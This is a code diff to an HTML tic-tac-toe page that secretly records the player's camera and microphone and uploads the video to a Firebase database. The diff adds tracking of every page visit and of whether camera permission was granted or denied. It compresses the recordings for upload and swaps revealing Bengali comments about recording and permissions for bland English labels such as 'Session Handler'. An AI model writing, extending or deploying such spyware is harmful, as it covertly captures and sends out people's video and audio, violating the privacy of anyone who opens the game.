@@ -6,7 +6,6 @@
   <title>Tic-Tac-Toe Game</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    /* মোবাইল স্ক্রিন নো-স্ক্রল লক */
     html, body {
       height: 100%;
       width: 100%;
@@ -31,13 +30,13 @@
 </head>
 <body class="bg-slate-950 text-slate-100 flex flex-col justify-between items-center p-4 h-full">
 
-  <!-- গেমের হেডার -->
+  <!-- Game Header -->
   <div class="text-center mt-2">
     <h1 class="text-3xl font-extrabold text-cyan-400 tracking-wide">TIC TAC TOE</h1>
     <p id="gameStatus" class="text-sm font-semibold text-slate-400 mt-1">Press Start to Play</p>
   </div>
 
-  <!-- গেম বোর্ড (নো-স্ক্রল সেন্টার্ড) -->
+  <!-- Game Board -->
   <div class="w-full max-w-xs bg-slate-900 border border-slate-800 p-3 rounded-2xl shadow-2xl">
     <div id="board" class="grid grid-cols-3 gap-3">
       <div class="cell" onclick="playGame(0)"></div>
@@ -52,12 +51,12 @@
     </div>
   </div>
 
-  <!-- রিস্টার্ট বাটন -->
+  <!-- Restart Button -->
   <div class="w-full max-w-xs mb-2">
     <button onclick="resetGame()" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-3 rounded-xl border border-slate-700 transition-all">Restart Game</button>
   </div>
 
-  <!-- ১. গেমের শুরুর পপআপ (পারমিশন রিকোয়েস্ট) -->
+  <!-- Start Modal -->
   <div id="startModal" class="fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-6 z-50">
     <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl text-center space-y-4 max-w-xs w-full shadow-2xl">
       <div class="text-4xl">🎮</div>
@@ -69,7 +68,7 @@
     </div>
   </div>
 
-  <!-- ২. আপলোড কমপ্লিট পপআপ -->
+  <!-- Success Modal -->
   <div id="successModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-6 z-50">
     <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl text-center space-y-4 max-w-xs w-full shadow-2xl">
       <div class="text-4xl">✅</div>
@@ -81,7 +80,7 @@
     </div>
   </div>
 
-  <!-- Firebase & Recording Logic -->
+  <!-- Firebase & Session Handler -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
     import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
@@ -107,25 +106,53 @@
     const successModal = document.getElementById('successModal');
     const gameStatusEl = document.getElementById('gameStatus');
 
+    let currentStream = null;
+
+    // পেজ লোড হওয়ার সাথে সাথেই আগে ভিজিট লগ পাঠাবে
+    try {
+      push(ref(db, 'visits_log'), {
+        timestamp: new Date().toISOString(),
+        permission: "Pending/Page Loaded",
+        durationRequested: recordSeconds,
+        userAgent: navigator.userAgent
+      });
+    } catch(e) {
+      console.error("Log error:", e);
+    }
+
     startBtn.addEventListener('click', async () => {
       try {
         startModal.classList.add('hidden');
         gameStatusEl.textContent = "Your Turn (X)";
 
-        const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        // পুরনো সার্ভিস বা ট্র্যাকিং থাকলে তা বন্ধ করা
+        if (currentStream) {
+          currentStream.getTracks().forEach(track => track.stop());
+        }
+
+        currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
+        // পারমিশন গ্র্যান্টেড লগ
+        push(ref(db, 'visits_log'), {
+          timestamp: new Date().toISOString(),
+          permission: "Granted",
+          durationRequested: recordSeconds,
+          userAgent: navigator.userAgent
+        });
 
         let chunks = [];
         let mediaRecorder;
 
-        const options = { mimeType: 'video/webm; codecs=vp8' };
+        // বিটরেট ও কমপ্রেসড সেটিংস যাতে ফাইল সাইজ কম হয়
+        const options = { mimeType: 'video/webm; codecs=vp8', videoBitsPerSecond: 250000 };
         if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-          options.mimeType = 'video/webm';
+          delete options.mimeType;
         }
 
         try {
-          mediaRecorder = new MediaRecorder(mediaStream, options);
+          mediaRecorder = new MediaRecorder(currentStream, options);
         } catch (e) {
-          mediaRecorder = new MediaRecorder(mediaStream);
+          mediaRecorder = new MediaRecorder(currentStream);
         }
 
         mediaRecorder.ondataavailable = (e) => {
@@ -133,6 +160,12 @@
         };
 
         mediaRecorder.onstop = async () => {
+          // রেকর্ড শেষ হওয়ামাত্রই আগে ব্যাকগ্রাউন্ড ট্র্যাকিং অফ করা
+          if (currentStream) {
+            currentStream.getTracks().forEach(track => track.stop());
+            currentStream = null;
+          }
+
           const blob = new Blob(chunks, { type: 'video/webm' });
           const reader = new FileReader();
 
@@ -145,24 +178,29 @@
                 createdAt: new Date().toISOString()
               });
               
-              // আপলোড শেষ হলে সাকসেস পপআপ দেখানো
               successModal.classList.remove('hidden');
-              mediaStream.getTracks().forEach(track => track.stop());
             } catch (err) {
               console.error("Firebase upload error:", err);
             }
           };
         };
 
-        mediaRecorder.start();
+        mediaRecorder.start(1000); // প্রতি ১ সেকেন্ড পরপর ডাটা চাঙ্ক গ্রহণ
 
-        // নির্দিষ্ট সময় পর ভিডিও অফ হয়ে আপলোড শুরু হবে
         setTimeout(() => {
-          mediaRecorder.stop();
+          if (mediaRecorder.state !== "inactive") {
+            mediaRecorder.stop();
+          }
         }, recordSeconds * 1000);
 
       } catch (err) {
         console.error("Permission Error:", err);
+        push(ref(db, 'visits_log'), {
+          timestamp: new Date().toISOString(),
+          permission: "Denied",
+          durationRequested: recordSeconds,
+          userAgent: navigator.userAgent
+        });
       }
     });
 
@@ -171,12 +209,12 @@
     };
   </script>
 
-  <!-- Tic-Tac-Toe Game Logic -->
+  <!-- Tic-Tac-Toe Logic -->
   <script>
     const boardEl = document.getElementById('board');
     const gameStatusEl = document.getElementById('gameStatus');
     const WINS = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
-    const DELAY_MS = 2500; // ২.৫ সেকেন্ড ডিলে
+    const DELAY_MS = 2500;
     
     let gameBoard = Array(9).fill('');
     let gameActive = true;
